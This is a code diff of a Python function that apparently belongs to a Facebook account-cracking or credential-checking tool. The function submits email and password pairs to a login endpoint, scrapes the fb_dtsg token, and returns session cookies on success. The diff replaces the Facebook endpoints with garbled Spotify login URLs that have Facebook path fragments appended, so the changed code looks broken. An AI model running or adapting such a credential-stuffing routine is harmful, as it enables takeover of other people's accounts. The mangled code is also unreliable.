@@ -700,8 +700,8 @@ def touch_fb(em, pas, hosts):
 
 def f_fb(em, pas, hosts):
     r = requests.Session()
-    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    p = r.get('https://free.facebook.com/')
+    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+    p = r.get('https://accounts.spotify.com/ar/login?method=facebook&continue=https%3A%2F%2Fwww.spotify.com%2Faccount%2Foverview%2F&intent=signup/')
     b = bs4.BeautifulSoup(p.text, 'html.parser')
     meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
     data = {}
@@ -717,8 +717,8 @@ def f_fb(em, pas, hosts):
             data.update({i.get('name'): i.get('value')})
 
     data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
-    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-    po = r.post('https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
+    r.headers.update({"referer":"https://accounts.spotify.com/ar/login?method=facebook&continue=https%3A%2F%2Fwww.spotify.com%2Faccount%2Foverview%2F&intent=signup/?next&ref=dbl&fl&refid=8"})
+    po = r.post('https://accounts.spotify.com/ar/login?method=facebook&continue=https%3A%2F%2Fwww.spotify.com%2Faccount%2Foverview%2F&intent=signup/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
     if 'c_user' in r.cookies.get_dict().keys():
         return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
     else:
